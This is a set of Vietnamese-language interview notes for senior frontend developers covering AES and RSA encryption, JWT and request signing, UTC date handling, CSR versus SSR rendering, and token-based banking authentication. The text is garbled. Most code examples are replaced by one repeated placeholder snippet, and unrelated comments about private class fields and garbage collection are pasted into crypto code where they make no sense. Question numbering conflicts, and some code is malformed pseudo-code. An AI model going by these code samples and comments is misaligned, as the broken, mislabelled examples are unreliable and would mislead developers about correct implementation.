  const encryptedSSN = encryptAES(user.ssn, encryptionKey);

  await db.users.create({
    id: user.id,
    email: user.email, // Không encrypt (cần query by email)
    phone: JSON.stringify(encryptedPhone),
    ssn: JSON.stringify(encryptedSSN),
  });
}

async function getUser(userId: string, encryptionKey: string): Promise<User> {
  const dbUser = await db.users.findById(userId);

  const encryptedPhone = JSON.parse(dbUser.phone);
  const encryptedSSN = JSON.parse(dbUser.ssn);

  return {
    id: dbUser.id,
    email: dbUser.email,
    phone: decryptAES(encryptedPhone, encryptionKey),
    ssn: decryptAES(encryptedSSN, encryptionKey),
  };
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import crypto from 'crypto';

 // Chú giải: =====================================
 // Chú giải: ASYMMETRIC ENCRYPTION WITH RSA
 // Chú giải: =====================================

 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
function generateRSAKeyPair(): { publicKey: string; privateKey: string } {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048, // Chú giải: 2048 bits (secure for most use cases)
    publicKeyEncoding: {
      type: 'spki',
      format: 'pem',
    },
    privateKeyEncoding: {
      type: 'pkcs8',
      format: 'pem',
    },
  });

  return { publicKey, privateKey };
}

// 🔹 ENCRYPT với PUBLIC KEY - Anyone có public key có thể encrypt
function encryptRSA(plaintext: string, publicKey: string): string {
  const buffer = Buffer.from(plaintext, 'utf8');

  const encrypted = crypto.publicEncrypt(
    {
      key: publicKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256',
    },
    buffer
  );

  return encrypted.toString('base64');
}

// 🔹 DECRYPT với PRIVATE KEY - Chỉ owner của private key mới decrypt được
function decryptRSA(ciphertext: string, privateKey: string): string {
  const buffer = Buffer.from(ciphertext, 'base64');

  const decrypted = crypto.privateDecrypt(
    {
      key: privateKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256',
    },
    buffer
  );

  return decrypted.toString('utf8');
}

 // Chú giải: 🔹 EXAMPLE - Secure message exchange
const alice = generateRSAKeyPair();
const bob = generateRSAKeyPair();

 // Chú giải: Alice gửi message cho Bob
const message = 'Secret meeting at 3pm';
const encryptedMessage = encryptRSA(message, bob.publicKey); // Dùng Bob's public key
console.log('Encrypted:', encryptedMessage);

 // Chú giải: Bob decrypt message
const decryptedMessage = decryptRSA(encryptedMessage, bob.privateKey); // Dùng Bob's private key
console.log('Decrypted:', decryptedMessage); // Chú giải: "Secret meeting at 3pm"

// ⚠️ Alice KHÔNG thể decrypt (không có Bob's private key)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// DIGITAL SIGNATURE: Đảo ngược Encryption!

 // Chú giải: ENCRYPTION (Bảo mật):
Encrypt với: RECEIVER's PUBLIC KEY    → Decrypt với: RECEIVER's PRIVATE KEY
Mục đích: Giấu message, chỉ receiver đọc được

// SIGNATURE (Xác thực):
Sign với: SIGNER's PRIVATE KEY        → Verify với: SIGNER's PUBLIC KEY
Mục đích: Chứng minh message từ signer, ai cũng verify được

// VÍ DỤ:
const { publicKey, privateKey } = generateKeys();

 // Chú giải: Sign document
const hash = SHA256(document);
const signature = RSA.encrypt(hash, privateKey); // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.

 // Chú giải: Verify signature
const hash1 = SHA256(document);
const hash2 = RSA.decrypt(signature, publicKey); // Chú giải: Verify = Decrypt với PUBLIC key
if (hash1 === hash2) console.log("✅ Valid signature!");

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

 // Chú giải: =====================================
 // Chú giải: JWT DIGITAL SIGNATURE WITH RS256
 // Chú giải: =====================================

 // Chú giải: 🔹 GENERATE RSA KEYS for JWT
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

 // Chú giải: 🔹 SIGN JWT - Server tạo token khi user login
function signJWT(payload: object): string {
 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
  const token = jwt.sign(payload, privateKey, {
    algorithm: 'RS256', // Chú giải: RSA with SHA-256
    expiresIn: '1h', // Chú giải: Token expires trong 1 giờ
    issuer: 'my-app', // Chú giải: App name
  });

  return token;
}

 // Chú giải: 🔹 VERIFY JWT - Server verify token từ client
function verifyJWT(token: string): object {
  try {
 // Chú giải: Verify với PUBLIC KEY
    const payload = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],
      issuer: 'my-app',
    });

    return payload as object;
  } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
      throw new Error('Token expired');
    }
    if (error instanceof jwt.JsonWebTokenError) {
      throw new Error('Invalid token');
    }
    throw error;
  }
}

 // Chú giải: 🔹 EXAMPLE - Authentication flow
interface JWTPayload {
  userId: string;
  email: string;
  role: string;
}

 // Chú giải: Login → Generate JWT
async function login(email: string, password: string): Promise<string> {
  const user = await authenticateUser(email, password);

  const payload: JWTPayload = {
    userId: user.id,
    email: user.email,
    role: user.role,
  };

  const token = signJWT(payload);
  console.log('Generated JWT:', token);
 // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.

  return token;
}

 // Chú giải: Protected route → Verify JWT
async function getProfile(token: string): Promise<JWTPayload> {
  const payload = verifyJWT(token) as JWTPayload;

  console.log('Verified user:', payload.userId);
  return payload;
}

 // Chú giải: 🔹 JWT STRUCTURE
// JWT có 3 phần (separated by dot):
 // Chú giải: HEADER.PAYLOAD.SIGNATURE

 // Chú giải: 1. HEADER (algorithm + type)
const header = {
  alg: 'RS256',
  typ: 'JWT',
};

 // Chú giải: 2. PAYLOAD (claims)
const payload = {
  userId: '123',
  email: 'user@example.com',
  role: 'admin',
  iat: 1234567890, // Chú giải: Issued at
  exp: 1234571490, // Chú giải: Expires at
};

 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
 // Chú giải: signature = RSA-SHA256(
 // Chú giải: base64(header) + '.' + base64(payload),
 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
 // Chú giải: )

 // Chú giải: ✅ Verify process:
 // Chú giải: 1. Decode header + payload từ JWT
 // Chú giải: 2. Compute signature với public key
 // Chú giải: 3. Compare với signature trong JWT
// 4. Nếu match → valid, không match → tampered

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import crypto from 'crypto';

 // Chú giải: =====================================
 // Chú giải: MANUAL RSA DIGITAL SIGNATURE
 // Chú giải: =====================================

// 🔹 SIGN DATA - Tạo chữ ký số
function signData(data: string, privateKey: string): string {
  const sign = crypto.createSign('SHA256');
  sign.update(data);
  sign.end();

  const signature = sign.sign(privateKey, 'base64');
  return signature;
}

// 🔹 VERIFY SIGNATURE - Xác thực chữ ký
function verifySignature(
  data: string,
  signature: string,
  publicKey: string
): boolean {
  const verify = crypto.createVerify('SHA256');
  verify.update(data);
  verify.end();

  return verify.verify(publicKey, signature, 'base64');
}

 // Chú giải: 🔹 EXAMPLE - API Request Signature
interface APIRequest {
  method: string;
  path: string;
  body: object;
  timestamp: number;
}

 // Chú giải: Client signs request
function signAPIRequest(request: APIRequest, privateKey: string): string {
 // Chú giải: Serialize request to string
  const requestString = JSON.stringify({
    method: request.method,
    path: request.path,
    body: request.body,
    timestamp: request.timestamp,
  });

 // Chú giải: Sign request
  return signData(requestString, privateKey);
}

 // Chú giải: Server verifies request
function verifyAPIRequest(
  request: APIRequest,
  signature: string,
  publicKey: string
): boolean {
  const requestString = JSON.stringify({
    method: request.method,
    path: request.path,
    body: request.body,
    timestamp: request.timestamp,
  });

 // Chú giải: Verify signature
  const isValid = verifySignature(requestString, signature, publicKey);

  if (!isValid) {
    console.log('❌ Invalid signature - request tampered or wrong key');
    return false;
  }

 // Chú giải: Check timestamp (prevent replay attacks)
  const now = Date.now();
  const age = now - request.timestamp;

  if (age > 5 * 60 * 1000) {
 // Chú giải: 5 minutes
    console.log('❌ Request too old - possible replay attack');
    return false;
  }

  console.log('✅ Signature valid');
  return true;
}

 // Chú giải: Example usage
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

const request: APIRequest = {
  method: 'POST',
  path: '/api/users',
  body: { name: 'John' },
  timestamp: Date.now(),
};

 // Chú giải: Client signs
const signature = signAPIRequest(request, privateKey);
console.log('Signature:', signature);

 // Chú giải: Server verifies
const isValid = verifyAPIRequest(request, signature, publicKey);
console.log('Valid?', isValid); // Chú giải: true

```js
// Ví dụ rút gọn
const example = 42;
```

`
1. Field-Level (App-Level) ⭐ RECOMMENDED
   → App encrypt trước khi lưu DB
   → Encrypt chỉ sensitive fields

2. Database-Level (TDE - Transparent Data Encryption)
   → Database tự encrypt toàn bộ
   → DBA vẫn đọc được

3. Hybrid ⭐ BEST PRACTICE
   → Passwords: Hash (bcrypt)
   → PII: Encrypt (AES-256-GCM)
   → Non-sensitive: Plaintext

---

**🔐 Implementation - Encryption Service**

```js
// Ví dụ rút gọn
const example = 42;
```

`

---

**🔐 User Service - Real Example**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🔐 Database Schema**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🔑 Key Management**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🔍 Searchable Encryption Pattern**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🔄 Key Rotation**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**✅ Best Practices**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**⚠️ Common Mistakes**

```js
// Ví dụ rút gọn
const example = 42;
```

1. ❌ Encrypting passwords (use hashing!)
2. ❌ Storing keys in database
3. ❌ Using same IV/salt
4. ❌ Encrypting everything (performance hit)
5. ❌ No key rotation strategy
6. ❌ Not planning for key compromise
7. ❌ Ignoring query limitations

---

#### **🔥 Best Practices**

**✅ DO:**

1. **Passwords**: Dùng bcrypt/argon2, KHÔNG dùng SHA-256
2. **Sensitive data**: Encrypt với AES-256-GCM trong database
3. **HTTPS**: Always enable trong production
4. **JWT**: Dùng RS256 (không dùng HS256 với shared secret)
5. **Key rotation**: Rotate encryption keys định kỳ
6. **IV/Salt**: Always random, unique mỗi lần
7. **Secrets**: Store trong environment variables/secret managers

**❌ DON'T:**

1. **KHÔNG dùng MD5/SHA-1**: Deprecated, vulnerable
2. **KHÔNG hardcode keys**: Trong source code
3. **KHÔNG reuse IV**: Trong AES encryption
4. **KHÔNG dùng ECB mode**: Trong AES (dùng GCM/CBC)
5. **KHÔNG share private keys**: Keep secret!
6. **KHÔNG dùng custom crypto**: Dùng libraries proven secure

---

#### **🎯 Common Mistakes & Corrections**

**❌ Mistake 1: Dùng SHA-256 cho passwords**

```js
// Ví dụ rút gọn
const example = 42;
```

**✅ Correction:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**❌ Mistake 2: Reuse IV trong AES**

```js
// Ví dụ rút gọn
const example = 42;
```

**✅ Correction:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**❌ Mistake 3: Hardcode encryption keys**

```js
// Ví dụ rút gọn
const example = 42;
```

**✅ Correction:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**❌ Mistake 4: Không verify JWT signature**

```js
// Ví dụ rút gọn
const example = 42;
```

**✅ Correction:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**🎯 Kết Luận:**

**Hashing:**

- ✅ One-way, dùng cho passwords (bcrypt), checksums (SHA-256)
- ✅ Không thể decrypt

**Encryption:**

- ✅ Two-way, dùng cho sensitive data (AES), key exchange (RSA)
- ✅ Symmetric (AES) nhanh, Asymmetric (RSA) chậm nhưng không cần share key

**Digital Signatures:**

- ✅ Verify authenticity & integrity
- ✅ JWT (RS256), API authentication, webhooks

**💡 Key Takeaway:**

- Hash cho verification, Encryption cho confidentiality, Signature cho authenticity
- Dùng proven libraries (bcrypt, crypto, jsonwebtoken)
- Never roll your own crypto!
---

## 41. Q41: ⏰ Q41: Date & Time Handling - Xử Lý Múi Giờ Đúng Cách

### P1: Tên câu hỏi: ⏰ Q41: Date & Time Handling - Xử Lý Múi Giờ Đúng Cách

### P2: Trả lời (Senior):

## 42. Q42: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"Dùng Timestamps (Unix milliseconds) hoặc ISO 8601 UTC cho storage/transmission, convert sang local timezone chỉ khi display. Libraries: date-fns, dayjs, Luxon."**

**🔑 Best Practices:**

**1. Storage & Transmission - Luôn UTC:**
- **Timestamp** (Unix ms): `Date.now()` = 1705329000000 - absolute time point
- **ISO 8601 UTC**: `new Date().toISOString()` = "2024-01-15T14:30:00.000Z"
- Database lưu TIMESTAMP hoặc DATETIME UTC
- API truyền ISO 8601 với 'Z' suffix (UTC)

**2. Display - Convert to Local:**
- `new Date(timestamp).toLocaleString('vi-VN', {timeZone: 'Asia/Ho_Chi_Minh'})`
- `Intl.DateTimeFormat` cho i18n formatting
- Show timezone explicitly: "15/01/2024 21:30 ICT"

**3. Avoid Native Date Pitfalls:**
- ❌ `new Date('2024-01-15')` → depends on browser timezone
- ❌ Months zero-indexed: `new Date(2024, 1, 15)` = Feb 15
- ❌ Mutable: `date.setMonth()` modifies original
- ✅ Use libraries: **date-fns** (functional, tree-shakable), **dayjs** (lightweight), **Luxon** (immutable, timezone-aware)

**4. Common Scenarios:**
- **User selects date**: Convert local → UTC before send server
- **Display server date**: Parse UTC → convert local timezone
- **Scheduling**: Store UTC + user's timezone separately
- **Recurring events**: Calculate in user's timezone (handle DST)

**⚠️ Lỗi Thường Gặp:**
- Lưu date string "DD/MM/YYYY" → parsing issues, dùng ISO 8601
- Compare dates không normalize timezone → sai kết quả
- Quên Daylight Saving Time (DST) → sai 1 giờ 2 lần/năm
- Dùng `Date()` constructor với string → browser-dependent parsing

**💡 Kiến Thức Senior:**
- **IANA timezone database**: "Asia/Ho_Chi_Minh", không dùng "GMT+7" (không handle DST)
- **ISO 8601 formats**: `2024-01-15T14:30:00Z` (UTC) vs `2024-01-15T14:30:00+07:00` (offset)
- **Temporal API** (TC39 Stage 3): Future replacement for Date - `Temporal.ZonedDateTime`
- **UTC Offset vs Timezone**: Offset = static (+7), Timezone = rules (handle DST, history)

**❓ Câu Hỏi:**
Làm thế nào xử lý Date/Time trong JavaScript không bị ảnh hưởng bởi múi giờ?

#### **⚠️ Vấn Đề Core**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **💡 Timestamp - Tại Sao Không Bị Ảnh Hưởng Timezone?**

**Timestamp = Số milliseconds từ 1970-01-01 00:00:00 UTC (Unix Epoch)**

```js
// Ví dụ rút gọn
const example = 42;
```

**So Sánh Trực Quan:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Kết Luận:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **💡 Nguyên Tắc Vàng**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **✅ Giải Pháp Đúng**

**1. Store UTC:**

```js
// Ví dụ rút gọn
const example = 42;
```

**2. Display Local:**

```js
// Ví dụ rút gọn
const example = 42;
```

**3. Compare Timestamps:**

```js
// Ví dụ rút gọn
const example = 42;
```

**4. Date Arithmetic:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **📚 Libraries (Recommend)**

**date-fns (Functional, Tree-shakeable):**

```js
// Ví dụ rút gọn
const example = 42;
```

**Luxon (OOP, Timezone-aware):**

```js
// Ví dụ rút gọn
const example = 42;
```

**Day.js (Lightweight 2KB):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🚀 Temporal API (Future)**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🎯 Best Practices**

**✅ DO:**

```js
// Ví dụ rút gọn
const example = 42;
```

**❌ DON'T:**

```js
// Ví dụ rút gọn
const example = 42;
```

**💡 Key Takeaway:**
- **Store UTC** → **Display Local**
- Dùng **timestamp** cho comparison
- Dùng **library** (date-fns/Luxon/Day.js)
- **Temporal API** = future standard

---

**🎯 Kết Luận Tổng Thể:**

**Performance Optimization (Q56):**

- ✅ 5-layer strategy: Build-time → Network → Rendering → State → Memory
- ✅ Measurable results: 70% faster load, 82% smaller bundle, 60 FPS
- ✅ Tools: Vite, React.memo, Zustand, react-window, Chrome DevTools

**Security (Q57):**

- ✅ 7-layer defense: HTTPS → XSS → CSRF → Auth → Storage → API → Headers
- ✅ Comprehensive protection: Input sanitization, JWT tokens, rate limiting
- ✅ Tools: DOMPurify, Helmet, Zod, bcrypt

**Cryptography (Q58):**

- ✅ Hash (bcrypt, SHA-256): Passwords, checksums, integrity
- ✅ Encryption (AES, RSA): Sensitive data, HTTPS, key exchange
- ✅ Digital Signatures (RS256, HMAC): JWT, API auth, webhooks

**Date & Time Handling (Q59):**

- ✅ UTC-first approach: Store UTC, display local timezone
- ✅ ISO 8601 standard: "2024-01-15T14:30:00.000Z"
- ✅ Libraries: date-fns (functional), Luxon (OOP), Day.js (lightweight)
- ✅ Temporal API: Future standard (Stage 3 proposal)

**💡 Key Takeaway:**

- Performance & Security KHÔNG phải optional - là MUST-HAVE cho production apps
- Date/Time: Always UTC for storage, convert to local for display
- Measure & Monitor trong production
- Defense in depth: Multiple layers of protection
- Use proven libraries - NEVER roll your own crypto or date handling!
---

## 43. Q43: 🖥️ Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Phân Biệt & Cách Hoạt Động Chi Tiết

### P1: Tên câu hỏi: 🖥️ Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Phân Biệt & Cách Hoạt Động Chi Tiết

### P2: Trả lời (Senior):

## 44. Q44: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"CSR = browser render (SPA), SSR = server render HTML. CSR tốt cho interactive apps, SSR tốt cho SEO/performance. Modern: Hybrid (SSR first paint + CSR hydration)."**

**🔑 So Sánh Chi Tiết:**

| **Metric** | **CSR** | **SSR** |
|-----------|---------|--------|
| **Initial Load** | Chậm (download JS → execute) | Nhanh (HTML ready) |
| **SEO** | Kém (crawlers không chờ JS) | Tốt (HTML đầy đủ) |
| **Navigation** | Nhanh (no reload) | Chậm (full page reload) |
| **Server Load** | Thấp (static CDN) | Cao (render mỗi request) |
| **Complexity** | Đơn giản (frontend only) | Phức tạp (isomorphic code) |

**🔑 CSR (Client-Side Rendering):**

**Cách hoạt động:**
1. Server gửi empty HTML + JS bundle (500KB-2MB)
2. Browser download → parse → execute JS
3. React/Vue render UI → attach events (hydration)

**Ưu điểm:**
- **Fast navigation** - no reload, smooth SPA experience
- **Rich interactions** - full JS power, real-time features
- **Low server cost** - CDN serving static files

**Nhược điểm:**
- **Slow First Paint** - chờ download + execute JS (2-5s)
- **Poor SEO** - crawlers không execute JS
- **Large bundle** - 500KB+ initial load

**🔑 SSR (Server-Side Rendering):**

**Cách hoạt động:**
1. Server render React/Vue → HTML string
2. Send full HTML (có content) về browser
3. Browser display ngay → download JS → hydrate (interactivity)

**Ưu điểm:**
- **Fast First Paint** - HTML ready, no JS blocking
- **SEO-friendly** - crawlers thấy full content
- **Better performance** on slow devices/networks

**Nhược điểm:**
- **High server load** - render mỗi request
- **TTFB slower** - server processing time
- **Complex setup** - isomorphic code, hydration issues

**⚠️ Lỗi Thường Gặp:**
- SSR dùng browser APIs (`window`, `localStorage`) → crash server
- Hydration mismatch (server HTML ≠ client HTML) → re-render flicker
- CSR không loading state → blank screen 3-5s
- SSR không cache → overload server

**💡 Kiến Thức Senior:**
- **Hybrid rendering**: Next.js SSG (static) + ISR (revalidate) + SSR (dynamic)
- **Streaming SSR**: Send HTML chunks progressively (React 18 Suspense)
- **Partial Hydration**: Chỉ hydrate interactive components (Islands Architecture - Astro)
- **Edge SSR**: Render on CDN edge (Vercel Edge, Cloudflare Workers) - faster TTFB

**Trả lời:**

#### **🎯 Khái Niệm Cốt Lõi**

**CSR (Client-Side Rendering):**
- Server gửi **HTML rỗng** (chỉ có `<div id="root"></div>`) + **JavaScript bundle** (500KB-2MB)
- Browser **download JS → parse → execute → render** → hiển thị nội dung
- Giống như: Mua IKEA furniture (phải tự lắp ráp ở nhà)
- Rendering engine: Browser (Chrome V8, Firefox SpiderMonkey)

**SSR (Server-Side Rendering):**
- Server **render sẵn HTML đầy đủ** (có nội dung) rồi gửi về browser
- Browser **hiển thị ngay** HTML → sau đó download JS để tương tác
- Giống như: Mua furniture đã lắp ráp sẵn (chỉ cần đặt vào nhà)
- Rendering engine: Node.js server (React renderToString)

#### **✅ Ưu Điểm CSR (Client-Side Rendering)**

**1. Navigation Cực Nhanh (Fast SPA Navigation)**

```js
// Ví dụ rút gọn
const example = 42;
```

**2. Rich Interactions (Tương Tác Phong Phú)**

```js
// Ví dụ rút gọn
const example = 42;
```

**3. Server Load Thấp (Less Server Load)**

```js
// Ví dụ rút gọn
const example = 42;
```

**4. Dễ Deploy & Scale**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **❌ Nhược Điểm CSR**

**1. Initial Load Chậm (Slow First Load)**

```js
// Ví dụ rút gọn
const example = 42;
```

**2. SEO Nghèo Nàn (Poor SEO)**

```js
// Ví dụ rút gọn
const example = 42;
```

**3. Blank Screen Problem**

```js
// Ví dụ rút gọn
const example = 42;
```

**4. Phụ Thuộc JavaScript**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **✅ Ưu Điểm SSR (Server-Side Rendering)**

**1. Initial Load Cực Nhanh (Fast Time to Content)**

```js
// Ví dụ rút gọn
const example = 42;
```

**2. SEO Xuất Sắc (SEO-Friendly)**

```js
// Ví dụ rút gọn
const example = 42;
```

**3. Better Performance (Đặc biệt cho slow devices)**

```js
// Ví dụ rút gọn
const example = 42;
```

**4. Không Blank Screen**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **❌ Nhược Điểm SSR**

**1. Server Load Cao (High Server Cost)**

```js
// Ví dụ rút gọn
const example = 42;
```

**2. Navigation Chậm Hơn (Slower Navigation)**

```js
// Ví dụ rút gọn
const example = 42;
```

**3. Complexity Cao (Complex Setup)**

```js
// Ví dụ rút gọn
const example = 42;
```

**4. TTFB Cao Hơn (Time to First Byte)**

```js
// Ví dụ rút gọn
const example = 42;
```

**5. Hydration Issues**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **📊 So Sánh Trực Quan**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🎯 Khi Nào Dùng Gì?**

**Dùng CSR khi:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Dùng SSR khi:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Dùng SSG (Hybrid) khi:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **💡 Key Takeaways**

**CSR (Client-Side):**
- 🚀 Navigation nhanh, tương tác mượt
- 💰 Chi phí thấp, dễ deploy
- ❌ Initial load chậm (3-5s), SEO kém
- 🎯 **Dùng cho**: Internal tools, SPAs, interactive apps

**SSR (Server-Side):**
- ⚡ Initial load nhanh (0.5-1s), SEO tốt
- ✅ Không blank screen, better UX
- ❌ Server cost cao, navigation chậm hơn
- 🎯 **Dùng cho**: Public sites, marketing, e-commerce

**Modern Approach:**
- **Mix cả 3**: SSG (static pages) + SSR (dynamic) + CSR (interactive)
- **Framework**: Next.js, Remix, Nuxt.js hỗ trợ cả 3
- **Measure**: Dùng Lighthouse, Web Vitals để optimize

---

#### **📊 Sơ Đồ So Sánh CSR vs SSR**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🔥 CSR (Client-Side Rendering) - Cách Hoạt Động Chi Tiết**

**Timeline:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Code Example (React CSR):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🚀 SSR (Server-Side Rendering) - Cách Hoạt Động Chi Tiết**

**Timeline:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Code Example (Next.js SSR):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **📊 So Sánh Chi Tiết CSR vs SSR**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🎯 Use Cases - Khi Nào Dùng CSR vs SSR?**

**✅ Dùng CSR khi:**

```js
// Ví dụ rút gọn
const example = 42;
```

**✅ Dùng SSR khi:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **⚡ Hybrid Approach - Static Site Generation (SSG)**

Next.js còn có SSG (Static Site Generation) - best of both worlds:

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **📋 Best Practices**

**1. CSR Optimization:**

```js
// Ví dụ rút gọn
const example = 42;
```

**2. SSR Optimization:**

```js
// Ví dụ rút gọn
const example = 42;
```

**3. Hybrid Strategy:**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🔍 Debugging & Measuring**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **❌ Common Mistakes**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **📊 Real-world Performance Comparison**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🎯 Decision Tree**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **💡 Summary**

**CSR (Client-Side Rendering):**

- ✅ Best for: SPAs, admin tools, internal apps
- ✅ Pros: Simple, fast navigation, low server cost
- ❌ Cons: Slow initial load, poor SEO, blank screen

**SSR (Server-Side Rendering):**

- ✅ Best for: Public pages, SEO-critical, e-commerce
- ✅ Pros: Fast initial load, SEO-friendly, no blank screen
- ❌ Cons: High server cost, complex, slower navigation

**SSG (Static Site Generation):**

- ✅ Best for: Blogs, docs, marketing pages
- ✅ Pros: Fastest, SEO-friendly, low cost (CDN)
- ❌ Cons: Stale data (solved with ISR)

**Modern Approach:**

```js
// Ví dụ rút gọn
const example = 42;
```

**Key Takeaway:**

- There's NO "best" approach - choose based on requirements
- Modern frameworks (Next.js, Remix) support all strategies
- Measure with real data: TTFB, FCP, TTI, Lighthouse
- SEO + Performance = SSR/SSG
- Interactivity + Simple = CSR

```js
// Ví dụ rút gọn
const example = 42;
```

---

## 45. Q45: 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security

### P1: Tên câu hỏi: 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security

### P2: Trả lời (Senior):

## 46. Q46: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**

**"Secure auth flow: Access Token (short-lived, 15min, memory) + Refresh Token (long-lived, 7-30 days, httpOnly cookie). Implement token rotation, XSS/CSRF protection, MFA cho high-security systems."**

**🔑 Architecture - Dual Token Pattern:**

**1. Access Token (JWT):**
- **Thời hạn**: 15 phút (ngắn - limit damage nếu stolen)
- **Lưu ở**: Memory (JS variable) - KHÔNG localStorage (XSS vulnerable)
- **Dùng để**: API calls - `Authorization: Bearer <token>`
- **Mất khi**: Refresh page → lấy lại từ refresh token

**2. Refresh Token:**
- **Thời hạn**: 7-30 ngày (dài - UX tốt)
- **Lưu ở**: **httpOnly Cookie** - JS không đọc được (chống XSS)
- **Flags**: `Secure` (HTTPS only), `SameSite=Strict` (chống CSRF)
- **Dùng để**: Lấy access token mới khi expired

**3. Authentication Flow:**

```js
// Ví dụ rút gọn
const example = 42;
```

**4. Security Measures:**
- **Token Rotation**: Refresh token thay đổi mỗi lần dùng (detect stolen tokens)
- **Token Blacklist**: Revoke tokens khi logout/suspicious activity
- **MFA**: 2FA/OTP cho sensitive operations (transfer, withdraw)
- **Device fingerprinting**: Detect unusual login locations
- **Rate limiting**: Max 5 failed attempts → lock account 30min

**⚠️ Lỗi Thường Gặp:**
- Lưu tokens trong localStorage → **XSS steal tokens**
- Không rotate refresh tokens → stolen token dùng mãi
- CORS misconfiguration → expose tokens cross-origin
- Không implement CSRF tokens → cross-site request attacks

**💡 Kiến Thức Senior:**
- **JWT structure**: Header.Payload.Signature (Base64URL encoded)
- **Signature algorithms**: HS256 (symmetric, shared secret) vs **RS256** (asymmetric, safer - banking)
- **Silent refresh**: Background refresh trước khi expired (smooth UX)
- **Token introspection**: Server-side validation cho high-security (không tin client JWT)
- **OAuth 2.0 + PKCE**: Authorization Code Flow với Proof Key (mobile apps)

**Trả lời:**

Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo mật cực kỳ cao** vì liên quan đến tiền bạc và thông tin nhạy cảm. Flow chuẩn sử dụng **JWT (JSON Web Token)** với **Access Token + Refresh Token** kết hợp **httpOnly Cookie**.

#### **📊 Tổng Quan Authentication Flow**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🔐 1. Access Token vs Refresh Token - Phân Biệt Chi Tiết**

**Access Token (Token Truy Cập):**

```js
// Ví dụ rút gọn
const example = 42;
```

**Refresh Token (Token Làm Mới):**

```js
// Ví dụ rút gọn
const example = 42;
```

**Tại Sao Cần 2 Token?**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🔄 2. Authentication Flow Chi Tiết (Step-by-Step)**

**A. Login Flow (Đăng Nhập):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**B. API Call Flow (Gọi API với Access Token):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

**C. Refresh Token Flow (Làm Mới Access Token):**

```js
// Ví dụ rút gọn
const example = 42;
```
